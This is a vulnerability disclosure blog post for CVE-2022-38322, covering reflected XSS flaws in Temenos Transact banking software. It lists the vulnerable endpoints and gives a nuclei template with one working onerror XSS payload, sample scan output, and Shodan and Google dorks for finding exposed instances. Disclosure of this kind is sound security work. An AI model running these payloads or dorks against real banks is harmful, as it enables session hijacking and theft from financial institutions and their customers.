---
title: Temenos Transact Vulnerable to Reflected XSS (CVE-2022-38322) 
date: 2024-07-08 00:00:00 +0000
categories: [CVE, XSS]
tags: [XSS,Temenos T24, Temenos Transact]    
description: Disclosing CVE-2022-38322 Multiple Reflected XSS Issues within Temenos Transact. 
pin: true
image:
    path: /high.jpg
---

## Introduction

In this post, I disclose CVE-2022-38322, multiple vulnerabilities in Temenos Transact (formerly T24) that allows multiple reflected cross-site scripting (XSS) attacks. This vulnerability poses significant risks to financial institutions using the platform, including potential data theft and session hijacking.


## Product Vendor
Temenos

## Product Description
Temenos Transact, previously known as T24, is a core banking software platform designed for retail, corporate, and private banking. Known for its flexibility and scalability, Transact helps financial institutions manage customer accounts, transactions, lending, and compliance efficiently. It supports a wide range of financial products and services, streamlining processes, reducing operational risks, and enhancing customer service.

## List of Temenos Clients

To search for potential Temenos clients by country or organization name, please refer to the [Unoficial Temenos Customers list](https://t24cc.com/posts/2020-06-05-Temenos-Customers-curated-list.html), as shown in the following screenshot.

![img-description](/temenos clients.jpeg)
_Temenos Clients In Egypt_

## Vulnerabilities Overview


**Type:** Reflected Cross-Site Scripting (XSS)

**Description:** XSS vulnerabilities occur when an attacker injects malicious scripts into a web application, which are then executed in the context of a user's browser. This can lead to data theft, session hijacking, and other malicious activities. XSS is a common and serious web security threat.

## Solution
> Temenos has not confirmed a patch. Temenos customers are advised to contact Temenos support for updates.
{: .prompt-danger }

## Vulnerability Details

During an internal security assessment of the Temenos T24 core banking application in 2022, multiple reflected XSS vulnerabilities were discovered across various endpoints and parameters. The vulnerabilities arise because the values of certain parameters are embedded in the HTML page on the server side without validation or sanitization, allowing malicious HTML and JavaScript code injection. This can enable attackers to execute JavaScript within the user session, steal session cookies, bypass CSRF protections, and perform actions on behalf of the victim user.


## Affected Endpoints and Parameters

A table below contains the Vulnerable endpoints , Number of vulnerable parameters and vulnerable parameters names per each endpoint


| Vulnerable Endpoint | No. of Parameters | Vulnerable Parameters |
|----------|----------------------|------------|
| /$root/jsps/enqrequest.jsp | 11 | enqaction, enqname, routineArgs, skin, compId, compScreen, windowName, user, reqTabid, WS_replaceAll, WS_parentComposite |
| /$root/jsps/about.jsp | 2 | skin, release |
| /$root/jsps/continue.jsp | 5 | cfwstage, compId, skin, user, windowName |
| /$root/jsps/customMessage.jsp | 1 | Message |
| /$root/jsps/dropdown.jsp | 9 | title, routineArgs, routineName, searchCriteria, dropfield, compId, skin, windowName, parentWin |
| /$root/jsps/fileUpload.jsp | 4 | skin, trans_upload, trans_uploading, fragment |
| /$root/jsps/genDocRequest.jsp | 3 | imageId, isPopUp, enqid |
| /$root/jsps/helprequest.jsp | 1 | url |
| /$root/jsps/submitWindow.jsp | 7 | requestType, routineArgs, companyId, unlock, closing, pwprocessid, windowName |
| /$root/jsps/svgInstall.jsp | 1 | skin |
| /$root/jsps/txnrequest.jsp | 5 | routineArgs, compId, compScreen, user, skin |
| /$root/jsps/genrequest.jsp | 6 | routineName, routineArgs, skin, compId, compScreen, user |


## Automation

A nuclei Template was developed to automate hunting those issues , kindly note the following:

1. Some payloads are caught by the Application and got blocked so I developed the template to just dectect reflection and once confirmed, the pentester shall craft a working payload (I only left one XSS Payload that most probably will work)

2. The application isn't always running under the web server root, if this the case make sure to pass the application root to nuclei (you can figure it by removing `servlet/BrowserServlet` from the login page URL )

{% raw %}
```yaml
id: CVE-2022-38322

info:
  name: Multiple Reflected XSS in Temenos Transact (Previously T24)
  author: qotoz
  severity: high
  tags: xss, transact, t24 , temenos
  reference:
    - http://qotoz.com/posts/Temenos-Transact-XSS-CVE/

requests:
  - method: GET
    path:
      - "{{BaseURL}}/jsps/enqrequest.jsp?enqaction=XSS&enqname=XSS&routineArgs=XSS&skin=XSS&compId=XSS&usrRole=XSS&compScreen=XSS&contextRoot=&windowName=XSS&user=XSS&reqTabid=XSS&WS_replaceAll=XSS&WS_parentComposite=XSS&command=&formToken="
      - "{{BaseURL}}/jsps/about.jsp?skin=XSS&release=XSS"
      - "{{BaseURL}}/jsps/continue.jsp?cfwstage=XSS&compId=XSS&skin=XSS&user=XSS&windowName=XSS"
      - "{{BaseURL}}/jsps/customMessage.jsp?Message=XSS"
      - "{{BaseURL}}/jsps/dropdown.jsp?title=XSS&routineArgs=XSS&routineName=XSS&searchCriteria=XSS&dropfield=XSS&compId=XSS&usrRole=XSS&skin=XSS&windowName=XSS&parentWin=XSS"
      - "{{BaseURL}}/jsps/fileUpload.jsp?skin=XSS&trans_upload=XSS&trans_uploading=XSS&fragment=XSS"
      - "{{BaseURL}}/jsps/genDocRequest.jsp?imageId=XSS&isPopUp=XSS&enqid=XSS"
      - "{{BaseURL}}/jsps/helprequest.jsp?url=XSS"
      - "{{BaseURL}}/jsps/submitWindow.jsp?requestType=XSS&routineArgs=XSS&companyId=XSS&unlock=XSS&closing=XSS&pwprocessid=XSS&windowName=XSS"
      - "{{BaseURL}}/jsps/svgInstall.jsp?skin=XSS"
      - "{{BaseURL}}/jsps/txnrequest.jsp?usrRole=XSS&routineArgs=XSS&compId=XSS&compScreen=XSS&user=XSS&skin=XSS"
      - "{{BaseURL}}/jsps/genrequest.jsp?routineName=XSS&routineArgs=XSS&skin=XSS&compId=XSS&compScreen=XSS&contextRoot=&user=XSS&formToken="
      - "{{BaseURL}}/jsps/helprequest.jsp?url=XSS%27)%22+onerror=%22confirm(%27XSS%27)%22+test=%22"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XSS"
        part: body 

      - type: status
        status:
          - 200
```
{: file="CVE-2022-38322.yaml" }

{% endraw %}


## POC: 

```bash
nuclei -t CVE-2022-38322.yaml -u https://transact.bank.local/

[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/enqrequest.jsp?enqaction=XSS&enqname=XSS&routineArgs=XSS&skin=XSS&compId=XSS&usrRole=XSS&compScreen=XSS&contextRoot&windowName=XSS&user=XSS&reqTabid=XSS&WS_replaceAll=XSS&WS_parentComposite=XSS&command&formToken
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/about.jsp?skin=XSS&release=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/continue.jsp?cfwstage=XSS&compId=XSS&skin=XSS&user=XSS&windowName=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/customMessage.jsp?Message=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/dropdown.jsp?title=XSS&routineArgs=XSS&routineName=XSS&searchCriteria=XSS&dropfield=XSS&compId=XSS&usrRole=XSS&skin=XSS&windowName=XSS&parentWin=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/fileUpload.jsp?skin=XSS&trans_upload=XSS&trans_uploading=XSS&fragment=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/genDocRequest.jsp?imageId=XSS&isPopUp=XSS&enqid=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/helprequest.jsp?url=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/submitWindow.jsp?requestType=XSS&routineArgs=XSS&companyId=XSS&unlock=XSS&closing=XSS&pwprocessid=XSS&windowName=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/svgInstall.jsp?skin=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/txnrequest.jsp?usrRole=XSS&routineArgs=XSS&compId=XSS&compScreen=XSS&user=XSS&skin=XSS
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/genrequest.jsp?routineName=XSS&routineArgs=XSS&skin=XSS&compId=XSS&compScreen=XSS&contextRoot&user=XSS&formToken
[CVE-2022-38322] [http] [high] https://transact.bank.local/jsps/helprequest.jsp?url=XSS%27)%22+onerror=%22confirm(%27XSS%27)%22+test=%22
```

## Dorks

In most cases Temenos Transact is an internal application that can't be accessed through the internet but some instances are being leaked and can be found using the following dorks

### Through Shodan: 

```
http.title:"transact sign in"
```
or 

```
http.title:"t24 sign in"
```

tttt

```
http.title:"transact sign in"

http.title:"t24 sign in"
```

### Through Google:

```
inurl:"servlet/BrowserServlet"
```

or 

```
intitle:"t24 sign in"
```

or 

```
intitle:"transact sign in"
```

tttt

```
inurl:"servlet/BrowserServlet"

intitle:"t24 sign in"

intitle:"transact sign in"
```


## Timeline


19/04/2022: Started the journey to get in touch with the vendor (vendor wasn't co-operative for two months)<br>
27/06/2022: Reported the issue to CISA Coordinated Vulnerability Disclosure (vendor didn't respond to CISA communications)<br>
15/09/2022: CVE-2022-38322 was assigned for this issue<br>
04/07/2024: Going live with the exploit<br>


